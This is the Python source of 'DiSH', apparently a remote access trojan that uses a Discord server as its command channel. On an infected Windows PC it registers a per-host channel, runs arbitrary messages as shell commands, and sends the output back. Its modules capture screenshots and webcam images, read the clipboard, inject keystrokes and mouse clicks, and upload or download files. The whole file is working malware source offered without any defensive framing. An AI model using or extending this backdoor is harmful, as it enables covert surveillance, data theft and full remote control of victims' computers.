import functools
import os
import platform
import socket
import subprocess
import sys
import time
import traceback
from datetime import datetime
from io import BytesIO
from typing import Optional, Sequence, Union
import discord
import dotenv
import requests
from modules import camera, filesystem, keyboard, misc, mouse, screen, sound

formatted_now = datetime.now().strftime("%d-%m-%Y %Y-%M-%S")

dish_dir = (
    os.path.normpath(os.environ["appdata"] + "/dish/")
    if os.path.exists(os.environ.get("appdata", "") + "/dish/")
    and platform.system().lower() == "windows"
    else "."
)

dotenv_path = (
    os.path.normpath(os.environ["appdata"] + "/dish/.env")
    if os.path.exists(os.environ.get("appdata", "") + "/dish/.env")
    else ".env"
)
try:
    dotenv.load_dotenv(dotenv_path)
except:
    traceback.print_exc()


# DiSH variables start here!

guild_id: int = int(os.getenv("GUILD_ID"))
category_id: int = int(os.getenv("CATEGORY_ID"))
try:
    token: str = os.environ["TOKEN"]
except:
    traceback.print_exc()
    sys.exit("No token specified")


def exec_command(command):
    """
    It executes a command and returns the output and error messages as a tuple.

    :param command: The command to be executed
    :return: A tuple of the stdout and stderr of the command.
    """

    executed = subprocess.run(command, capture_output=True, text=True, shell=True)
    return (executed.stdout, executed.stderr)


# It's a discord client that connects to a specific guild and category, and has a dictionary of
# modules that can be called.
class RemoteClient(discord.Client):
    def __init__(self, guild_id: int, category_id: int, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.guild_id: int = guild_id
        self.category_id: int = category_id
        self.hostname: str = socket.gethostname()
        self.channel = None
        self.modules = {
            "dump": filesystem.dump,
            "cd": filesystem.cd,
            "pwd": filesystem.pwd,
            "browser": misc.browser,
            "play": sound.play,
            "screenshot": screen.screenshot,
            "upload": filesystem.upload,
            "download": filesystem.download,
            "edit": filesystem.edit,
            "press": keyboard.press,
            "typewrite": keyboard.typewrite,
            "hotkey": keyboard.hotkey,
            "special": keyboard.specialKeys,
            "loc": mouse.loc,
            "click": mouse.click,
            "cam": camera.cam,
            "help": misc.dish_help,
            "clipboard": misc.clipboard,
        }

    async def on_ready(self):
        """
        It creates a channel with the name of the hostname and username of the user that launched the
        bot.
        """
        print(f"Logged in as {self.user}")
        guild: discord.Guild = self.get_guild(self.guild_id)
        category: discord.CategoryChannel = guild.get_channel(self.category_id)
        channel_name: str = (
            self.hostname.lower().replace(" ", "-").replace(".", "")
            + "-"
            + os.getlogin().lower().replace(" ", "-").replace(".", "")
        )
        channel = guild.get_channel(int(os.getenv("LOGS_ID")))
        for a in category.text_channels:
            if a.name == channel_name:
                self.channel = a
        if self.channel == None:
            self.channel = await guild.create_text_channel(
                channel_name, category=category
            )
        print(self.channel.name)
        await self.channel.send(
            f"Bot launched succesfully on PC {self.hostname} as {os.getlogin()}"
        )
        await channel.send(
            f"Bot launched on {self.hostname} as {os.getlogin()} on channel {self.channel.mention}"
        )

    async def on_message(self, message: discord.Message):
        """
        It takes a message, splits it into a list of words, and then tries to execute the first word as a
        command. If it can't find the command, it executes the message as a command in the command line.

        :param message: The message object that triggered the event
        :type message: discord.Message
        :return: The return value is a tuple of two strings, the first being the stdout and the second being
        the stderr.
        """

        if message.channel == self.channel or message.channel.id == int(
            os.getenv("GLOBAL_ID")
        ):
            if message.author.id == self.user.id:
                return
            parsed = message.content.split(" ")
            
            async def patched_send(
            content="",
            tts=False,
            embed=None,
            file=None,
            stickers=[],
            delete_after=None,
            nonce=None,
            allowed_mentions=discord.AllowedMentions.all(),
            reference=None,
            mention_author=False,
            view=None,
            suppress_embeds=False,
            silent=False,
            poll=None,
            ):
                await message.channel.send(
                    f"{self.channel.mention}\n{content}",
                    embed=embed,
                    file=file,
                    stickers=stickers,
                    delete_after=delete_after,
                    nonce=nonce,
                    allowed_mentions=allowed_mentions,
                    reference=reference,
                    mention_author=mention_author,
                    view=view,
                    suppress_embeds=suppress_embeds,
                    silent=silent,
                    poll=poll,
                )


            if message.channel.id == int(os.getenv("GLOBAL_ID")):
                # Replace the send method of the message's channel with the one from the new channel
                send=patched_send
            else:
                send = message.channel.send

            try:
                if len(parsed) > 1:
                    await self.modules[parsed[0]](self, message, " ".join(parsed[1:]), send)
                else:
                    await self.modules[parsed[0]](self, message, "", send)
            except KeyError:
                executor = functools.partial(exec_command, parsed)
                res = await self.loop.run_in_executor(None, executor)

                try:
                    if len(res[0]) > 0:

                        await send(f"Stdout: ```bat\n{res[0]}\n```")
                    if len(res[1]) > 0:
                        await send(f"Stderr: ```bat\n{res[1]}\n```")
                except:
                    traceback.print_exc()
                    f = BytesIO(f"Stdout: {res[0]}\n\nStderr: {res[1]}```".encode())
                    await send(file=discord.File(f, "output.txt"))

            except:
                traceback.print_exc()
                exc = traceback.format_exc()
                await send(f"Python Errors: ```py\n{exc}\n```")


if __name__ == "__main__":
    connected = False
    while not connected:
        try:
            r = requests.get("https://discord.com")
            if r.status_code == 200:
                connected = True
            time.sleep(2)
        except:
            pass
        time.sleep(1)

    client = RemoteClient(guild_id, category_id, intents=discord.Intents.all())
    client.run(token)
